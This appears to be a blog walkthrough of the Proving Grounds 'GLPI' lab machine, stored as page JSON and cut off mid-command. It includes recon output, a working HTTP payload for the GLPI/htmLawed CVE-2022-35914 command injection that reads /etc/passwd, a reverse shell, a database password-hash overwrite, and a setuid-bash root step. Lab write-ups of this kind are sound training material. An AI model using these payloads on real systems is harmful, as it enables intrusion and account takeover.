{"componentChunkName":"component---src-templates-post-template-tsx","path":"/240825/","result":{"data":{"allMarkdownRemark":{"edges":[{"node":{"html":"<h2>1. Machine Info</h2>\n<p>GLPI is a very-hard community rated Proving Grounds Machine. PG’s rating is easy, but no way that this machine is easy or even OSCP-niveau.</p>\n<p>But still, as a fresh start with PG, I decided to dig in more to this machine.</p>\n<blockquote>\n<p>As always, let’s dive into the machine!</p>\n</blockquote>\n<h2>2. Recon</h2>\n<p>Starting with nmap scan:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">┌──(hosan㉿kali)-[~/pg/glpi]\r\n└─$ sudo nmap 192.168.231.242 -T4 -p-\r\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-31 14:17 EDT\r\nStats: 0:01:47 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan\r\nSYN Stealth Scan Timing: About 91.88% done; ETC: 14:19 (0:00:10 remaining)\r\nNmap scan report for 192.168.231.242\r\nHost is up (0.043s latency).\r\nNot shown: 65533 filtered tcp ports (no-response)\r\nPORT   STATE SERVICE\r\n22/tcp open  ssh\r\n80/tcp open  http\r\n\r\nNmap done: 1 IP address (1 host up) scanned in 113.88 seconds</code></pre></div>\n<p>Digging in to port 80</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">┌──(hosan㉿kali)-[~]\r\n└─$ sudo nmap 192.168.152.242 -p80 -A -sC -sV       \r\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-31 14:50 EDT\r\nNmap scan report for 192.168.152.242\r\nHost is up (0.041s latency).\r\n\r\nPORT   STATE SERVICE VERSION\r\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))\r\n|_http-title: Authentication - GLPI\r\n|_http-server-header: Apache/2.4.41 (Ubuntu)\r\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\r\nOS fingerprint not ideal because: Missing a closed TCP port so results incomplete\r\nNo OS matches for host\r\nNetwork Distance: 4 hops\r\n\r\nTRACEROUTE (using port 80/tcp)\r\nHOP RTT      ADDRESS\r\n1   45.01 ms 192.168.45.1\r\n2   45.01 ms 192.168.45.254\r\n3   45.02 ms 192.168.251.1\r\n4   45.04 ms 192.168.152.242\r\n\r\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\r\nNmap done: 1 IP address (1 host up) scanned in 16.05 seconds</code></pre></div>\n<p>There is nothing valuable we can find here. Let’s move on to webapp enumeration.</p>\n<h2>2. Initial Foothold</h2>\n<p>There is a http webapp. By visiting the site:</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 768px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/b1334a478ddf4ca77e2c9a675324a791/31e31/glpi-1.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 76.04166666666667%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAYAAADkmO9VAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABU0lEQVR42qWUX0vDMBTF98UVfBfxMygIKooMnwWn7+oQRRQc1enc2q35t2ZJmuPN1gnr1uG20ENu0nt+veGS1lRmUaWhdkj6HINUImUSragNoTSWeWrLXgplsLu3j4PDIxyfnmFrewfRZwcjC8ihqQbKCimq8O7hEffNJzy/vKH93UVC1Yb9Ks8YODJuoazLAU9PobCuyg0a6gIYkhcNKRUY4+BCgHEOrTWWjQCtBtIe44IawsBpTgmcbQI01s4BPCVOtTLQOQdBRw7gEAfleT7W2kCp1AxoI2AwZpmGpQrLx10LaIxFkiTUkBRKCThr6COWNJlXBnoycrpmfemQWT9t/J9WABZm3YNpncBEF9BRHeq9Dnxdwn+cww+a07b/HwjDgN41EN8i7zZgOw1a3wA/V/DidTa3DAxXpiwmDXrCI5YeCakvJ3EsQhxyzJwn/Bx+AS7zkorcbKX5AAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/b1334a478ddf4ca77e2c9a675324a791/a59e9/glpi-1.webp 192w,\n/static/b1334a478ddf4ca77e2c9a675324a791/0ca9f/glpi-1.webp 384w,\n/static/b1334a478ddf4ca77e2c9a675324a791/dc9b9/glpi-1.webp 768w,\n/static/b1334a478ddf4ca77e2c9a675324a791/4d2cd/glpi-1.webp 986w\"\n              sizes=\"(max-width: 768px) 100vw, 768px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/b1334a478ddf4ca77e2c9a675324a791/3b721/glpi-1.png 192w,\n/static/b1334a478ddf4ca77e2c9a675324a791/66595/glpi-1.png 384w,\n/static/b1334a478ddf4ca77e2c9a675324a791/fe486/glpi-1.png 768w,\n/static/b1334a478ddf4ca77e2c9a675324a791/31e31/glpi-1.png 986w\"\n            sizes=\"(max-width: 768px) 100vw, 768px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/b1334a478ddf4ca77e2c9a675324a791/fe486/glpi-1.png\"\n            alt=\"glpi-1\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n  </a>\n    </span></p>\n<p>Maybe we should start subdirectory enumeration.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">┌──(hosan㉿kali)-[~]\r\n└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -u http://192.168.152.242/FUZZ -fs 280\r\n\r\n        /'___\\  /'___\\           /'___\\       \r\n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \r\n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \r\n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \r\n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \r\n          \\/_/    \\/_/   \\/___/    \\/_/       \r\n\r\n       v2.1.0-dev\r\n________________________________________________\r\n\r\n :: Method           : GET\r\n :: URL              : http://192.168.152.242/FUZZ\r\n :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt\r\n :: Follow redirects : false\r\n :: Calibration      : false\r\n :: Timeout          : 10\r\n :: Threads          : 40\r\n :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500\r\n :: Filter           : Response size: 280\r\n________________________________________________\r\n\r\njs                      [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 165ms]\r\nplugins                 [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 166ms]\r\ncss                     [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 166ms]\r\ntemplates               [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 172ms]\r\ninstall                 [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 172ms]\r\nbin                     [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 185ms]\r\nfiles                   [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 62ms]\r\najax                    [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 63ms]\r\nconfig                  [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 50ms]\r\ninc                     [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 44ms]\r\nlib                     [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 47ms]\r\npublic                  [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 42ms]\r\npics                    [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 39ms]\r\n.                       [Status: 200, Size: 9033, Words: 2913, Lines: 225, Duration: 58ms]\r\nsrc                     [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 44ms]\r\nsound                   [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 49ms]\r\nvendor                  [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 64ms]</code></pre></div>\n<p>There are some interesting outputs. Let’s start with /files directory</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 580px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/3cf9dbee19c2a09b1435646d0c725170/2af67/glpi-2.webp\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 113.54166666666666%; position: relative; bottom: 0; left: 0; background-image: url('data:image/webp;base64,UklGRngAAABXRUJQVlA4IGwAAACQBACdASoUABcAPtFepU6oJSMiKAqpABoJZwAALmnTgo+ZUmVk8fCE1gLCWAAA/sB88k+4Ru7hOW70T/9ijUz6/e4dgGIZfi1Lg25HwzEzEgmBnwnNg8EWd+xul+OMjBzciQKXWxOg/DAAAAA='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/3cf9dbee19c2a09b1435646d0c725170/a59e9/glpi-2.webp 192w,\n/static/3cf9dbee19c2a09b1435646d0c725170/0ca9f/glpi-2.webp 384w,\n/static/3cf9dbee19c2a09b1435646d0c725170/2af67/glpi-2.webp 580w\"\n              sizes=\"(max-width: 580px) 100vw, 580px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/3cf9dbee19c2a09b1435646d0c725170/a59e9/glpi-2.webp 192w,\n/static/3cf9dbee19c2a09b1435646d0c725170/0ca9f/glpi-2.webp 384w,\n/static/3cf9dbee19c2a09b1435646d0c725170/2af67/glpi-2.webp 580w\"\n            sizes=\"(max-width: 580px) 100vw, 580px\"\n            type=\"image/webp\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/3cf9dbee19c2a09b1435646d0c725170/2af67/glpi-2.webp\"\n            alt=\"glpi-2\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n  </a>\n    </span></p>\n<p>We should just play around for a while. Then, I found under _cache:</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 582px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/1f57f509c40449758938f07ebb79d315/0b5a5/glpi-2.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 73.4375%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAYAAADkmO9VAAAACXBIWXMAAA7DAAAOwwHHb6hkAAACDklEQVR42rVT23KiQBDl/78l+2pV9iVqYmlCRKNuXO8XriKiwIAJt5OesWDRquzTbledmp6e4XBON0jN5iPq9ToeHhoYDn/h6amFlxcZd3c/0G530O328P4+hix30Wg0xflqtYaqathuVQGeF5A6nQ7u73+i2WxgOh1DUWRsNhvUajU8P7cwGvXp4pKIO/SiNlqtBsKQgUee57gNqSgmCeDsc0SRuCpqngccjxl0PYFtA4zxfY493bPtnOqXNctyQc4hxXGM6Bzi5IXoKgEmU4Y4jhAEDIOBh37fI2U+2T9hufTx9sYRoNcL8PrKV4Y0/aNUkqlf2sLGXjvhaB3h6C4OVkAaq3byCjJSkpY5cG1bkmUZ6/GOyBg+zykiFiONyfo5Kpu/3zuwrB0c5yDsXSyixBXhXHnE5rcFfe6SOp+UejizBGEUYj6fU590muRWDGq325G9lAgzfBfSsKdcCGcOzOWBVMbigNEEVqsVNE0rYdNkXNelwUXfE24HLcyGFpYjF+rshI+PDEnKJ8ywWCyEOo71ei0U8kn+VaE6VjCZhISE8EnWYlKWkqKAsCXLBvWO99AqLSf0jXFSnnNcEfKLuq7BMHR6yIRpGmLP6wUJB89N0xTWDcMQvVVVVaxVUsmjr9f3PdGziAbB++P7vtgXCMNLvcg5qmfVP0bCPw6p+GUKVOO2Xl1va/9N4RfgBHaHTI0dCgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/1f57f509c40449758938f07ebb79d315/a59e9/glpi-2.webp 192w,\n/static/1f57f509c40449758938f07ebb79d315/0ca9f/glpi-2.webp 384w,\n/static/1f57f509c40449758938f07ebb79d315/4ddc4/glpi-2.webp 582w\"\n              sizes=\"(max-width: 582px) 100vw, 582px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/1f57f509c40449758938f07ebb79d315/3b721/glpi-2.png 192w,\n/static/1f57f509c40449758938f07ebb79d315/66595/glpi-2.png 384w,\n/static/1f57f509c40449758938f07ebb79d315/0b5a5/glpi-2.png 582w\"\n            sizes=\"(max-width: 582px) 100vw, 582px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/1f57f509c40449758938f07ebb79d315/0b5a5/glpi-2.png\"\n            alt=\"glpi-2\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n  </a>\n    </span></p>\n<p>So we can clearly argue that we have glpi version 10.0.2.</p>\n<p>I immediately started to google for cve. Then I found this Github Repo.</p>\n<blockquote>\n<p><a href=\"https://github.com/0xGabe/CVE-2022-35914\" target=\"_blank\" rel=\"nofollow\">https://github.com/0xGabe/CVE-2022-35914</a></p>\n</blockquote>\n<p>Apparently, there exists RCE vector. But we need htmlLawedTest.php. Visiting the /vedor folder which we should have to execute cve:</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 768px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/f7bbed298c156f67eabe27699729e5fb/f3280/glpi-3.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 63.541666666666664%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAIAAAAmMtkJAAAACXBIWXMAAAsTAAALEwEAmpwYAAACAUlEQVR42qWRbU/aUBiG+2v2EpcJgzCILoO5TOeHZb9iWeIEioDM/zZmKKAEAoq22pKWsr7QirrSt9OWvuy0ZB+26b545cnJ/eG5n/s85yBv3m7nNra33n98t/nhdXYzl9vKrG+srqZT6Wwqk3uZzsaTr2KJ9Vg8E3uxFk+sPXueevQ08WQl+Xgliex8QUvlr5VitVTaL+yWDoqV4l7t0+fdAlpF0f0aWturHuSL1fxOvlyulWDl0XyxUkBhVZFut1uv1wkCPz3t4ziOYVirhXU67Wbze7uNtY+avV7n8PBbq9VoYI1ms3V8fCRJUhAEvu8jTggwTefqyrJtBwCgKECWLZY1JcmcTk1RhMIWRWAa5hLP84II5PZWVdXQSRBA0yzPcxTF4TiHpm1ZdiTJ4XmbZa3JxPY8P/gTpNPBLy9dklyw7MK24UgfABihm6a6FK7rRJ1/O0PzYEAPh97ZmYvjLgBhB8fxo9GIJCkoWHai68ZywzvMvR5Fkv7FhUtRrmGEHbIsC4LA87wUYVlWcA8weXxy4g6Hi35/MRg4guBxnMhGiGIo4Avdaz4//0FRAcN4BOHjuE/TwXQq8xHwCvD8XzLD8CR5zTA34zGsa5q+4fmpKApcBAyfzWbwP+CIf9dGVHWu64quzzVNUdWfUOi6rmna/DeKohiGcXdy8AB+AeXhkoTd5cw2AAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/f7bbed298c156f67eabe27699729e5fb/a59e9/glpi-3.webp 192w,\n/static/f7bbed298c156f67eabe27699729e5fb/0ca9f/glpi-3.webp 384w,\n/static/f7bbed298c156f67eabe27699729e5fb/dc9b9/glpi-3.webp 768w,\n/static/f7bbed298c156f67eabe27699729e5fb/01ffc/glpi-3.webp 789w\"\n              sizes=\"(max-width: 768px) 100vw, 768px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/f7bbed298c156f67eabe27699729e5fb/3b721/glpi-3.png 192w,\n/static/f7bbed298c156f67eabe27699729e5fb/66595/glpi-3.png 384w,\n/static/f7bbed298c156f67eabe27699729e5fb/fe486/glpi-3.png 768w,\n/static/f7bbed298c156f67eabe27699729e5fb/f3280/glpi-3.png 789w\"\n            sizes=\"(max-width: 768px) 100vw, 768px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/f7bbed298c156f67eabe27699729e5fb/fe486/glpi-3.png\"\n            alt=\"glpi-3\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n  </a>\n    </span></p>\n<p>Here is the tricky part. I couldn’t get RCE even if I tried to use the CVE above.</p>\n<p>I thought this might be rabbit hole, but there was absolutely no vector except this one. So I started to download the php file and look into the source code.</p>\n<p>Then, I realized that I have to modify CVE manually, because clearly the execution logic was slightly different.</p>\n<p><strong>BUT THIS IS FAR BEYOND FROM OSCP</strong></p>\n<p>So, I used a resource from internet:</p>\n<blockquote>\n<p><a href=\"https://mayfly277.github.io/posts/GLPI-htmlawed-CVE-2022-35914/\" target=\"_blank\" rel=\"nofollow\">https://mayfly277.github.io/posts/GLPI-htmlawed-CVE-2022-35914/</a></p>\n</blockquote>\n<p>The logic behind this manual exploit is following:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\"># reference reminder of htmLawed's original hook function call\r\n$C['hook']($t, $C, $S);\r\n\r\n# translated to our situation\r\narray_map('call_user_func', $C, $S);\r\n\r\n# contents of our arrays parsed from the POST req payload\r\n$C = ['array_map', 'system'];\r\n$S = [null, 'cat /etc/passwd'];\r\n\r\n  # first iteration of array_map\r\n  call_user_func('array_map', null);\r\n\r\n    # output; note that this is a warning, not an error, thus will not halt execution\r\n    PHP Warning:  Uncaught ArgumentCountError: array_map() expects at least 2 arguments, 1 given\r\n\r\n  # second iteration of array_map\r\n  call_user_func('system', 'cat /etc/passwd');\r\n\r\n    # output (RCE!)\r\n    root:x:0:0:root:/root:/bin/bash\r\n    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\r\n    bin:x:2:2:bin:/bin:/usr/sbin/nologin\r\n    sys:x:3:3:sys:/dev:/usr/sbin/nologin\r\n    ...</code></pre></div>\n<p>I used following payload at the end:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">POST /vendor/htmlawed/htmlawed/htmLawedTest.php HTTP/1.1\r\nHost: 192.168.200.242\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 804\r\nOrigin: http://192.168.200.242\r\nConnection: close\r\nReferer: http://192.168.200.242/vendor/htmlawed/htmlawed/htmLawedTest.php\r\nCookie: glpi_8ac3914e6055f1dc4d1023c9bbf5ce82=i6ou75hltjpuhvmsqs40bqoe36; sid=foo\r\nUpgrade-Insecure-Requests: 1\r\n\r\ntext=call_user_func&amp;hhook=array_map&amp;hfoo=system&amp;spec[0]=&amp;spec[1]=cat+/etc/passwd&amp;sid=foo</code></pre></div>\n<p>Then I got the RCE and also the revshell.</p>\n<h2>3. PrivEsc to user.</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">┌──(kali㉿kali)-[~]\r\n└─$ nc -lvnp 80\r\nlistening on [any] 80 ...\r\nconnect to [192.168.45.210] from (UNKNOWN) [192.168.200.242] 51038\r\nsh: 0: can't access tty; job control turned off\r\n$ bash -i\r\nbash: cannot set terminal process group (1102): Inappropriate ioctl for device\r\nbash: no job control in this shell\r\nwww-data@glpi:/var/www/glpi/vendor/htmlawed/htmlawed$ </code></pre></div>\n<p>I ran my linpeas.sh, and found following config data:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">$ cat config_db.php\r\n&lt;?php\r\nclass DB extends DBmysql {\r\n   public $dbhost = 'localhost';\r\n   public $dbuser = 'glpi';\r\n   public $dbpassword = 'glpi_db_password';\r\n   public $dbdefault = 'glpi';\r\n   public $use_utf8mb4 = true;\r\n   public $allow_myisam = false;\r\n   public $allow_datetime = false;\r\n   public $allow_signed_keys = false;\r\n}</code></pre></div>\n<p>So I could login to mysql, and found user betty.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">7       betty   $2y$10$jG8/feTYsguxsnBqRG6.judCDSNHY4it8SgBTAHig9pMkfmMl9CFa </code></pre></div>\n<p>We can also try to decrypt the hash with hashcat, but Since we have update permission, We can</p>\n<ol>\n<li>Encrypt our new password with the same format above</li>\n<li>And update the DB</li>\n</ol>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">XXX = $2a$10$78dZ08Q8LotnMJ8Dl1uutON6/R.L6KNXPbWhAnRr66tnGGi3V3d/.\r\n\r\nupdate glpi_users SET password = '$2y$10$Kq6wuIrbcED3xBHQSTp2W.845KRt5vDRrcka9cDufnDF1EKpsQ/PO' where username ='betty';</code></pre></div>\n<p>I couldn’t use SSH with this new credential. But maybe, we can login to the website from (1)!</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 768px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/60e93d8e309121361cc0b40597375786/51f47/glpi-5.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 65.625%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAIAAAAmMtkJAAAACXBIWXMAAAPoAAAD6AG1e1JrAAABBUlEQVR42p2PYVeDIBSG/f8/p/ra99o3akMmOA/IFKa2uWJK67juAStby9Xe85x7QHkul8A0+3F4qrjUQFFtj34F19UtLwSTjErKlgxY5Ilff1aAr3hhSo95NQeXYPKMQk2QRA/Zo9imf2HdbHrZvlmymmMd8lpcIkdFBHKoQ6ww1JnC/VaHi3VyTi4pdibUaT7FTvO9Zh+4vsT3/SbTisEnGH5eRP8bu+u6Zt8MMdZsXuojavOFaXbULONdHhx+pG1bhBAhhFIaxzFUxliWZeUgV/ndTX5/QrbWJkkCWuoipRRCcBdYaK1B7sc+KcMh0Hz1vlJqePMZ2d/wW8ZkeOHTaLz8Dktp0QgE/BwZAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/60e93d8e309121361cc0b40597375786/a59e9/glpi-5.webp 192w,\n/static/60e93d8e309121361cc0b40597375786/0ca9f/glpi-5.webp 384w,\n/static/60e93d8e309121361cc0b40597375786/dc9b9/glpi-5.webp 768w,\n/static/60e93d8e309121361cc0b40597375786/0ad40/glpi-5.webp 892w\"\n              sizes=\"(max-width: 768px) 100vw, 768px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/60e93d8e309121361cc0b40597375786/3b721/glpi-5.png 192w,\n/static/60e93d8e309121361cc0b40597375786/66595/glpi-5.png 384w,\n/static/60e93d8e309121361cc0b40597375786/fe486/glpi-5.png 768w,\n/static/60e93d8e309121361cc0b40597375786/51f47/glpi-5.png 892w\"\n            sizes=\"(max-width: 768px) 100vw, 768px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/60e93d8e309121361cc0b40597375786/fe486/glpi-5.png\"\n            alt=\"glpi-5\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n  </a>\n    </span></p>\n<p>Finally, we can ssh into the machine as user betty!</p>\n<h2>4. PrivEsc to root.</h2>\n<p>Even if the first part was extremly hard, privesc to root wasn’t also easy.</p>\n<p>After running linpeas once more, I found a suspicious folder under /opt</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">$ cd /opt\r\n$ ls -la\r\ntotal 12\r\ndrwxr-xr-x  3 root root 4096 Jan 25  2023 .\r\ndrwxr-xr-x 19 root root 4096 Jan 24  2023 ..\r\ndrwxr-xr-x  7 root root 4096 Jan 25  2023 jetty\r\n$ cd jetty\r\n$ ls\r\nbin  etc  jetty-base  lib  LICENSE.txt  modules  NOTICE.txt  README.adoc  start.jar  VERSION.txt</code></pre></div>\n<p>Another webserver is running by server, and it is using jetty. And user betty has full access to this app and folder.</p>\n<p>After searching for a while for any privesc vector, I found this image from the internet:</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 768px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/f2616331f8c725ec4f8b8423ffc5b053/46352/glpi-6.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 57.8125%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAIAAADtbgqsAAAACXBIWXMAAAPoAAAD6AG1e1JrAAABrklEQVR42nVSa3OaQBRlX6gsIJJiIC2N4Y2A0lZNiVJjxTCx/dD//2uyu2pqzOTMmd29e+fcs3PvSkAAQkSIjBkI4bEEzgAFwWn9D4npAMZult7m469pMirGEGFJAoLnOL/hsteQO3UVRdV1iDGr1en1yiwJktgLozTLx8WkmJZFWeaTaZikXhB5YWzffJaATAQxkGVBApWuoum7zZ9N+2/Z7Kttu9w9V03LDov1blY387qZ1dsgKyUnT+w8cSZjd5o5RWrlcT+6o3p//tA8Pu5Xu7/36/bHsvn+sC1//j6nl0wlK/aHcWBGnhGOmGwQeb0vNhN/q7ar+mm12S/qp3nd3q+fF79aVvGN+Cr2r5JgwMV3VhpakU9dhz27qjblYp3P6o94G2ZczJT6yFVcB1oD8MmAlgkJMU3TMAxVVSmlbIqEteMCEPCGwQ7vEyCYkx26HYCQbTvD4TUTI4SOU70YHbvBZp+P5/RXIEI8AaEuQKmqsBGqGvOHJ8gcHUywxN3guxch6GtaoGmeQkO9HxsDn6o3GF86Cx9wKHkwPySgfAyPqyD7vMyUELHJ8gsJazkzqbsnzwAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/f2616331f8c725ec4f8b8423ffc5b053/a59e9/glpi-6.webp 192w,\n/static/f2616331f8c725ec4f8b8423ffc5b053/0ca9f/glpi-6.webp 384w,\n/static/f2616331f8c725ec4f8b8423ffc5b053/dc9b9/glpi-6.webp 768w,\n/static/f2616331f8c725ec4f8b8423ffc5b053/e2c2f/glpi-6.webp 1152w,\n/static/f2616331f8c725ec4f8b8423ffc5b053/f3efb/glpi-6.webp 1536w,\n/static/f2616331f8c725ec4f8b8423ffc5b053/6a898/glpi-6.webp 1542w\"\n              sizes=\"(max-width: 768px) 100vw, 768px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/f2616331f8c725ec4f8b8423ffc5b053/3b721/glpi-6.png 192w,\n/static/f2616331f8c725ec4f8b8423ffc5b053/66595/glpi-6.png 384w,\n/static/f2616331f8c725ec4f8b8423ffc5b053/fe486/glpi-6.png 768w,\n/static/f2616331f8c725ec4f8b8423ffc5b053/d2d74/glpi-6.png 1152w,\n/static/f2616331f8c725ec4f8b8423ffc5b053/e8464/glpi-6.png 1536w,\n/static/f2616331f8c725ec4f8b8423ffc5b053/46352/glpi-6.png 1542w\"\n            sizes=\"(max-width: 768px) 100vw, 768px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/f2616331f8c725ec4f8b8423ffc5b053/fe486/glpi-6.png\"\n            alt=\"glpi-6\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n  </a>\n    </span></p>\n<p>We have kind-of xml injection here.\r\nSo I basically injected revshell execution code, then got revshell as root.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">$ ls\r\nbin  etc  jetty-base  lib  LICENSE.txt  modules  NOTICE.txt  README.adoc  start.jar  VERSION.txt\r\n$ cd jetty-base\r\n$ ls\r\njetty.state  resources  start.d  webapps\r\n$ cd webapps\r\n$ echo \"chmod +s /bin/bash\" > 